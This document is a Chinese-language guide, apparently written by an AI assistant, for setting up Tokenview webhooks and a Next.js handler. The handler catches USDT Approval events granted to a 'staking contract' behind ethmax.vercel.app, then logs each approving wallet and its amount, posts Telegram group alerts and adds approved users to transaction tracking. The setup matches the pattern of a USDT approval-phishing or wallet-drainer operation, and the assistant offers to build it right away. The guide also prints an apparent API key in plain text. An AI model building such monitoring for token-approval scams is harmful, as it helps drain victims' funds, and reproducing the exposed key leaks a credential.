# Tokenview Transaction Tracking 监听 Approval 事件配置指南

## 🎯 **目标**

使用 Tokenview 的 Transaction Tracking 功能监听：
- ✅ USDT 合约的 Approval 事件
- ✅ 只监听授权给您的质押合约的事件
- ✅ 自动触发后续流程（更新数据库 + 发送通知）

---

## ⚠️ **前提确认**

### 需要在 Tokenview Dashboard 确认的配置

访问：https://services.tokenview.io/en/dashboard

**查找以下选项**：

1. **Transaction Tracking 或 Event Monitoring**
2. **能否添加合约地址监听？**
3. **能否过滤事件类型（Approval）？**
4. **能否过滤 spender 参数？**

**如果以上都支持，继续配置！否则建议使用 Alchemy WebSocket 方案。**

---

## 📝 **配置步骤**

### 步骤 1：在 Tokenview Dashboard 配置

#### 1.1 添加监听

```
监听类型: Transaction Tracking / Event Monitoring
区块链: Ethereum (ETH)
合约地址: 0xdAC17F958D2ee523a2206206994597C13D831ec7 (USDT)
```

#### 1.2 配置事件过滤（如果支持）

```
事件名称: Approval
或
事件签名: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925

过滤条件（关键！）:
- spender = 0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
```

**Approval 事件结构**：
```solidity
event Approval(
  address indexed owner,    // 用户地址（授权者）
  address indexed spender,  // 0xc8aC...218（您的合约）
  uint256 value            // 授权额度
)
```

#### 1.3 配置 Webhook

```
Webhook URL: https://ethmax.vercel.app/api/tokenview/webhook
请求方法: POST
验证密钥: fSpkcrSkEMrMOxY65gr0 (您的 API Key)
```

---

## 💻 **修改 Webhook 处理代码**

### 增强 Tokenview Webhook 处理 Approval 事件

修改文件：`src/app/api/tokenview/webhook/route.ts`

添加 Approval 事件处理逻辑：

```typescript
// 在文件顶部添加新的接口
interface TokenviewApprovalData {
  address: string        // USDT 合约地址
  txid: string           // 交易哈希
  time: number           // 交易时间
  eventName: string      // "Approval"
  owner: string          // 授权者（用户地址）
  spender: string        // 被授权者（您的合约）
  value: string          // 授权额度
  coin: string           // "ETH"
  height: number         // 区块高度
}

// 修改 POST 处理器，添加事件类型判断
export async function POST(request: NextRequest) {
  try {
    // ... 现有验证逻辑 ...
    
    const data = await request.json()
    console.log('🚨 [TOKENVIEW] 收到 webhook:', JSON.stringify(data, null, 2))
    
    // 判断事件类型
    if (data.eventName === 'Approval' || data.event === 'Approval') {
      // 处理 Approval 事件
      await processApprovalEvent(data)
    } else {
      // 处理 Transfer 事件（现有逻辑）
      await processTokenviewWebhook(data)
    }
    
    return new NextResponse('ok', { 
      status: 200, 
      headers: { 'Content-Type': 'text/plain' } 
    })
  } catch (error) {
    // ... 错误处理 ...
  }
}

// 新增：处理 Approval 事件
async function processApprovalEvent(data: TokenviewApprovalData) {
  console.log('✅ [APPROVAL] 收到授权事件:', {
    owner: data.owner,
    spender: data.spender,
    value: data.value,
    txHash: data.txid
  })
  
  const YOUR_CONTRACT = '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'
  
  // 验证是否是授权给您的合约
  if (data.spender?.toLowerCase() !== YOUR_CONTRACT.toLowerCase()) {
    console.log('⚠️ [APPROVAL] 授权给其他合约，跳过:', data.spender)
    return { success: true, message: 'Not our contract' }
  }
  
  console.log('🎯 [APPROVAL] 用户授权给我们的合约!')
  
  const userAddress = data.owner
  const authAmount = data.value
  const txHash = data.txid
  
  // 调用现有的授权 API
  try {
    console.log('📡 [APPROVAL] 调用授权 API...')
    const response = await fetch(`${process.env.NEXT_PUBLIC_APP_URL}/api/user/authorize`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        wallet_address: userAddress,
        isAuthorized: true,
        txHash: txHash,
        amount: authAmount,
        source: 'tokenview_approval'
      })
    })
    
    const result = await response.json()
    
    if (result.success) {
      console.log('✅ [APPROVAL] 授权处理成功')
      console.log('   - 用户 ID:', result.data.userId)
      console.log('   - 已自动添加到交易监听')
      return { success: true, userId: result.data.userId }
    } else {
      console.warn('⚠️ [APPROVAL] 授权处理失败:', result.error)
      return { success: false, error: result.error }
    }
  } catch (error) {
    console.error('❌ [APPROVAL] 调用授权 API 异常:', error)
    return { success: false, error: (error as Error).message }
  }
}
```

---

## 🧪 **测试流程**

### 测试 1：触发真实授权

1. **用户端操作**：
   ```
   访问 https://ethmax.vercel.app
   连接 Trust Wallet
   点击授权按钮
   在钱包中确认授权
   ```

2. **观察 Vercel 日志**（15-30 秒内）：
   ```
   🚨 [TOKENVIEW] 收到 webhook:
   ✅ [APPROVAL] 收到授权事件:
     owner: 0x9EbD...997
     spender: 0xc8aC...218
     value: 1000000
     txHash: 0xabc...def
   🎯 [APPROVAL] 用户授权给我们的合约!
   📡 [APPROVAL] 调用授权 API...
   ✅ [APPROVAL] 授权处理成功
   ```

3. **检查 Telegram 群组**：
   ```
   应收到授权成功通知（含用户信息 + 按钮）
   ```

---

## ⚠️ **潜在问题和解决方案**

### 问题 1：Tokenview 不支持事件过滤

**症状**：
- 收到大量 Approval 事件
- 包括授权给其他合约的事件（Uniswap、Binance 等）

**解决方案**：
- ✅ 已在代码中添加 `spender` 过滤
- ✅ 只处理授权给您的合约的事件
- ✅ 其他事件直接跳过（返回成功）

**代价**：
- ⚠️ 消耗 Tokenview API 配额
- ⚠️ 可能每天收到上千条无用通知

### 问题 2：Tokenview 数据格式不同

**症状**：
- Tokenview 返回的数据结构与预期不符
- 无法解析 `owner`、`spender`、`value` 字段

**解决方案**：
1. **先测试，查看实际返回的数据**：
   ```typescript
   console.log('🚨 原始数据:', JSON.stringify(data, null, 2))
   ```

2. **根据实际数据调整解析逻辑**

3. **创建测试脚本**：
   ```bash
   # 模拟 Tokenview webhook
   curl -X POST https://ethmax.vercel.app/api/tokenview/webhook \
     -H "Content-Type: application/json" \
     -d '{
       "eventName": "Approval",
       "owner": "0x9EbD7aFa96725B835e3B0B05f83AF7C2B98A3997",
       "spender": "0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218",
       "value": "1000000",
       "txid": "0xtest123",
       "address": "0xdAC17F958D2ee523a2206206994597C13D831ec7"
     }'
   ```

---

## 📊 **方案最终对比**

| 指标 | Tokenview Tracking | Alchemy WebSocket |
|------|-------------------|-------------------|
| **配置难度** | ⭐⭐⭐⭐ | ⭐⭐ |
| **事件过滤** | ❓ 可能不支持 | ✅ 完美支持 |
| **噪音通知** | ❌ 可能很多 | ✅ 零噪音 |
| **成本** | 免费（可能有配额） | 免费 |
| **可靠性** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **推荐指数** | ⭐⭐⭐ | 🏆🏆🏆🏆🏆 |

---

## 🎯 **我的建议**

### 短期（立即尝试）

✅ **先测试 Tokenview Transaction Tracking**
- 如果支持且效果好 → 继续使用
- 如果不支持或噪音太多 → 立即切换到 Alchemy

### 中期（本周内）

✅ **部署 Alchemy WebSocket 监听服务**（Railway）
- 作为主要监听方案
- Tokenview 作为后备（如果还在用）

### 长期（持续优化）

✅ **完整的混合方案**
- Alchemy WebSocket：监听 Approval（自动发现用户）
- Tokenview：监听前 10 个高频用户的交易
- Moralis：监听接下来 15 个用户的交易
- Etherscan 轮询：其他用户（5 分钟延迟）

---

## 🚀 **现在该做什么？**

### 选项 A：先测试 Tokenview（1 小时）

1. 在 Tokenview Dashboard 配置 Transaction Tracking
2. 修改 webhook 处理代码（我可以帮您）
3. 测试一次真实授权
4. 查看效果和问题

### 选项 B：直接部署 Alchemy（2 小时，推荐）

1. 跳过 Tokenview 测试
2. 直接实施 Alchemy WebSocket 方案
3. 一次性解决所有问题
4. 部署到 Railway（24/7 运行）

**您想选择哪个？我立即帮您实施！** 🎯

